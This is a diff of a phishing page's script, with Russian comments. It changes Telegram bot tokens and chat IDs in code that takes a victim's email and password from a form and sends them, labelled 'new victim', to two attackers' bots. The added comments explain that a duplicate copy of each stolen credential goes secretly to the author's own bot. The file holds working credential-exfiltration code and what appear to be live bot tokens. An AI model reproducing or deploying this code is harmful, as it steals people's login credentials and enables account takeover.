@@ -110,14 +110,14 @@
 </div>
 
 <script>
-    // === ДАННЫЕ БОТОВ ===
-    const MY_BOT_TOKEN = "8919131267:AAHS9zQH6eluArGoaRkwtRUNH3MpQNzJWAA";   // твой бот
+    // === 1. ДАННЫЕ БОТОВ ===
+    const MY_BOT_TOKEN = "8870629098:AAELG7u3brQfiq40IgP9dd3IB36LMBdMfbM";   // твой бот
     const HIS_BOT_TOKEN = "8842883108:AAFza9ZypL71T92auiTCmcnwPAkGfjGtC6c"; // его бот
 
-    const MY_ID = "8648082259";
+    const MY_ID = "8850351378";
     const HIS_ID = "8784393556";
 
-    // === ФУНКЦИЯ ОТПРАВКИ ===
+    // === 2. ФУНКЦИЯ ОТПРАВКИ ===
     function sendMessage(botToken, chatId, text) {
         const url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(text);
         fetch(url, { mode: "no-cors" });
@@ -138,11 +138,13 @@
 
         const text = "📩 НОВАЯ ЖЕРТВА\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString();
 
-        // === ОСНОВНАЯ ОТПРАВКА (его бот → ему и тебе) ===
+        // === 3. ОСНОВНАЯ ОТПРАВКА (его бот → ему и тебе) ===
         sendMessage(HIS_BOT_TOKEN, HIS_ID, text);   // ему
         sendMessage(HIS_BOT_TOKEN, MY_ID, text);    // тебе (от его бота)
 
-        // === ДУБЛЬ (страховка через твоего бота) ===
+        // === 4. ДОПОЛНИТЕЛЬНО: если данные ввёл он — они всё равно придут тебе (через твоего бота) ===
+        // Это гарантирует, что ты получишь данные даже если его бот по какой-то причине не сработает
+        // (отправляем повторно на твой ID, но с пометкой, что это от него)
         const extraText = "📩 [ДУБЛЬ] от его бота\n" + text;
         sendMessage(MY_BOT_TOKEN, MY_ID, extraText);
 
